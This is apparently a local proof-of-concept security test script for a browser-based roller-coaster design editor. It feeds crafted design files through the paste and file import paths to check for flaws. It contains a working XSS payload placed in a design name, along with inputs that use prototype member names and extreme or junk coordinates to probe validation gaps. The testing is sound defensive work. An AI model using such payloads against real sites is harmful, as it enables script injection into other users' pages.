// PoC 1 — untrusted coaster designs (paste box, .coaster.json file, saved list).
// Local only: runs the audit copy through tests/harness.js (no network; three.js from the npm package).
// Usage: node reports/security/poc1_design_import.js
const path = require('path');
const { open } = require(path.join(__dirname, '../../tests/harness.js'));
const F = path.join(__dirname, 'coaster_lab_v8_6.audit-copy.html');
const log = (...a) => console.log(...a);
const XSS = '"><img src=x onerror=__xss(1)><svg onload=__xss(2)>';
const st = [['station', {}], ['lift', {}], ['drop', {}], ['turn', {}], ['hill', {}], ['turn', {}]];
const v2 = (name, els = st) => ({ v: 2, name, els: els.map(([t, p]) => ({ t, p })) });

const CASES = {
  // A. XSS in the name of a v2 design (paste + file)
  xssName: JSON.stringify(v2(XSS)),
  // B. classic (v1) design: points go through migrateV1() and skip the finite/|x|<300 point filter in sanDesign
  v1Huge: JSON.stringify({ name: 'v1 huge', pts: [[0, 0, 0], [20, 0, 0], [1e15, 40, 1e15], [-1e15, 30, 1e15], [60, 10, 80], [10, 2, 60]] }),
  v1Junk: JSON.stringify({ name: 'v1 junk', pts: [[0, 0, 0], [20, 0, 0], ['a', 'b', 'c'], [null, null, null], [60, 10, 80], [10, 2, 60]] }),
  // C. section type that is an Object.prototype member: ET[e.t] is truthy, ET[e.t].ps is undefined
  protoType: JSON.stringify({ v: 2, name: 'proto', els: [{ t: 'station', p: {} }, { t: 'constructor', p: {} }] }),
  protoType2: JSON.stringify({ v: 2, name: 'proto2', els: [{ t: '__proto__', p: {} }] }),
};

async function viaFile(page, txt) {
  // the real 📂 "Open a coaster file" input (fin85) and its change handler
  const inp = await page.$('input[type=file][accept=".json,application/json"]');
  await inp.setInputFiles({ name: 'x.coaster.json', mimeType: 'application/json', buffer: Buffer.from(txt) });
}
async function viaPaste(page, txt) {
  // the real builder 📁 Files → "Share as text" box (#b8IO) and its ⬇ Import button (b8ProjAct('imp'))
  await page.evaluate(() => window.__coasterDebug.v80.bld.act('files')); await page.waitForTimeout(500);
  await page.evaluate(t => { document.querySelector('#b8IO').value = t; document.querySelector('[data-b8pj="imp"]').click() }, txt);
}

(async () => {
  for (const [k, txt] of Object.entries(CASES)) {
    for (const via of ['paste', 'file']) {
      const { browser, ctx, page, errors } = await open(F, { storage: { 'coasterlab.tut.v2': '1' } });
      page.setDefaultTimeout(90000);
      await page.evaluate(() => { window.__xss = n => { (window.__xssHits = window.__xssHits || []).push(n) } });
      await page.evaluate(() => window.__coasterDebug.v80.v86.openBuilder()); await page.waitForTimeout(800);
      await page.evaluate(() => document.querySelectorAll('#b8Tour,#dlg7,#bDlg').forEach(e => e.hidden = true));
      const before = await page.evaluate(() => window.__coasterDebug.bld.D().name);
      const t0 = Date.now(); let hung = false;
      try {
        await (via === 'file' ? viaFile(page, txt) : viaPaste(page, txt));
        // auto-accept the "unsaved changes" confirm if it appears
        await page.waitForTimeout(1500);
        await page.evaluate(() => { const y = document.querySelector('#dlg7:not([hidden]) #dlg7Y, #bDlg:not([hidden]) #bDlgY'); if (y) y.click() });
        await page.waitForTimeout(1500);
        await Promise.race([page.evaluate(() => 1), new Promise((_, r) => setTimeout(() => r(new Error('main thread blocked')), 60000))]);
      } catch (e) { hung = true; log('   !', e.message) }
      const ms = Date.now() - t0;
      let res = {};
      if (!hung) res = await page.evaluate(() => { const D = window.__coasterDebug.bld.D(); return { name: D.name, n: D.els.length, maxAbs: Math.max(0, ...D.els.flatMap(e => (e.p && e.p.pts || []).flat().map(x => x == null ? NaN : Math.abs(x)))), hasNull: D.els.some(e => (e.p && e.p.pts || []).flat().some(x => x === null)), toast: (document.querySelector('#toast') || {}).textContent, xss: window.__xssHits || [], img: document.querySelectorAll('img[src="x"],svg[onload]').length } });
      log(`${k} via ${via}: ${hung ? 'HUNG' : 'ok'} in ${ms} ms; before="${before}"`, JSON.stringify(res));
      errors.slice(0, 3).forEach(e => log('   console error:', e.slice(0, 220)));
      await browser.close();
    }
  }
})();
